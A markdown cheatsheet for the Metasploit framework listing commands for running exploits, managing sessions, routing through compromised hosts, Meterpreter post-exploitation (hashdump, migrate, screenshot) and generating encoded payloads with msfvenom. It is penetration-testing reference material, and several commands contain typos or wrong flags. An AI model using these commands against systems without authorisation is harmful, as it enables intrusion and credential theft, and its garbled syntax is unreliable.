# Metasploit Cheatsheet:

## Basic Metasploit :

User can use all regualr bash command in msfconsole ex. ls, cd, whoami, etc.

- Search for exploit:
```
msf6 > search [module name ex.smb, ftp, windows] type [module type: Auxiliary, post, expolit]
`````
- Use exploit:
````
msf6 > use exploit/[ExploitPath]
``````
- Specify a Payload to use:
````
msf6 > set PAYLOAD [PayloadPath]
``````
- Show options for the current modules:
````
msf6 > show options
``````` 
for Advanced options
````
msf6 > show Advanced options
```````
- Set options:
```
msf6 > set [Option] [Value]
`````
For null value use '' ex. set PASSWORD ''.

- Run exploit:
```
msf6 > exploit
`````
 or
````
msf6 > run
``````
- Information of Exploit:
````
msf6 exploit_type(exploit name) > info
``````
- Check exploit working or not:
````
msf6 exploit_type(exploit name) > check
``````
- Back to previous Moduleaas:
```
msf6 > back
`````
- Exit from Msfconsole:
```
msf6 > exit
`````
## Multiple Exploitation:
- Run the exploit expecting a single session that is immediately backgrounded:
```
msf > exploit -z
``````
- Run the exploit in the background expecting one or more sessions that are immediately backgrounded:
````
msf > exploit –j
`````
- List all current jobs (usually exploit listeners):
```
msf > jobs –l
````
- Kill a job:
```
msf > jobs –k [JobID]
`````
## Multiple Sessions:

- List all backgrounded sessions:
```
msf > sessions -l
``````
- Interact with a backgrounded sessions:
````
msf > session -i [SessionID]
```````
- Background the current interactive session:
```
meterpreter > <Ctrl+Z>
`````
 or
````
meterpreter > background 
```````
## Routing Through Sessions:
- Adding Route:
````
msf > route add [Subnet to Route To] [Subnet Netmask] [SessionID]
````
- Deletting route:
````
msf > route del [Subnet to Route To] [Subnet Netmask] [SessionID]
````
- To print route:
````
msf > rout print
``````
- Port Forwording:
```
msf > portfwd -l [local port] -p [victim port] -r [remote ip]
``````
## Meterpreter:

User can use all commands used on bash depends on his authority on the compromised system.

### Process Commands:
- Display the process ID of Metepreter
```
meterpreter > getpid
````
- Display the user ID that Meterpreter is running with:
```
meterpreter > getuid
`````
- Display process list
```
meterpreter > ps
``````
- Terminate a process given its process ID
````
meterpreter > kill
``````
- Run a given program with the privileges of the process the Meterpreter is loaded in:
````
meterpreter > execute
```````
- Jump to a given destination process ID
````
meterpreter > migrate
``````
### Network Commands:
- Show network interface information
````
meterpreter > ipconfig
``````
- Save as an image a screenshot of the target machine
````
meterpreter > screenshot
`````````
- Load the priv module
```
meterpreter > use priv
`````````
- Dump hashes from the box 
````
meterpreter > hashdump
``````
## Generating encodedcpaytload:
```
$ msfvenom –p [payload user want] -e [encoder] -i [no. of iteration of encoder] -f [file type of payload] -L [localhost] -P [local port] -o [output file]
`````

